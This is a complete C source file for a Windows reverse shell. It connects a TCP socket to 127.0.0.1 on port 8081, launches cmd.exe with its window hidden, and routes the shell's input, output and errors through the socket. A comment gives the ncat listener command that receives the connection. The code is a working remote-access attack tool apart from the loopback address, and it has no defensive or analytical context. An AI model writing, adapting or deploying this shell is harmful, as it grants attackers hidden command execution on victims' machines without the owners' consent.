#include <stdio.h>
#include <WinSock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#pragma comment (lib, "kernel32.lib")
#pragma comment (lib, "ws2_32.lib")

// windows >>
// "~path/ncat.exe" -nvlp 8081

#define MAX_COMMAND 1024

int main() {

	WSAData wsa;
	SOCKET	socket;
	sockaddr_in sockaddr;

	INT result;
	LPCSTR pszIPAddress = "127.0.0.1"; 
	INT port = 8081;
	
	char recvServer[MAX_COMMAND];
	char cmd[] = "cmd.exe";

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	result = WSAStartup(MAKEWORD(2, 2), &wsa);

	if (result != 0) return -1;

	socket = WSASocket(AF_INET,
			   SOCK_STREAM,
			   IPPROTO_TCP,
			   NULL,
			   0,
			   0);

	if (socket == INVALID_SOCKET) return -1;

	// define the socket
	sockaddr.sin_port = htons(port);
	sockaddr.sin_family = AF_INET;
	InetPtonA(AF_INET, pszIPAddress, &sockaddr.sin_addr.s_addr);
	
	result = WSAConnect(socket,
			    (SOCKADDR*)&sockaddr,
			    sizeof(sockaddr),
			    NULL,
			    NULL,
			    NULL,
			    NULL);

	if (result == SOCKET_ERROR) return -1;

	// setting the startup info struct
	SecureZeroMemory(&si, sizeof(si)); // init si struct

	si.cb = sizeof(si);

	si.dwFlags = (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES); // sets both flags for window and I/O props.

	si.wShowWindow = HIDE_WINDOW;

	si.hStdInput = (HANDLE)socket; // set the default input as the socket, so the server can send its input.
	si.hStdOutput = (HANDLE)socket; // pipes the output to the server.
	si.hStdError = (HANDLE)socket; // pipes the errors to the server.

	// executes new cmd process
	CreateProcessA(NULL, // no applicaition
		       cmd,  // cmd.exe
		       NULL,
		       NULL, 
		       TRUE,
		       0,   
		       NULL,
		       NULL,
		       &si,  // process startup info
		       &pi); // process info

	WaitForSingleObject(pi.hProcess, INFINITE); // wait to the process to be exited (hProcess)

	// Close both Thread and Process handlers.
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	SecureZeroMemory(recvServer, sizeof(recvServer));
	
	return 0;
}
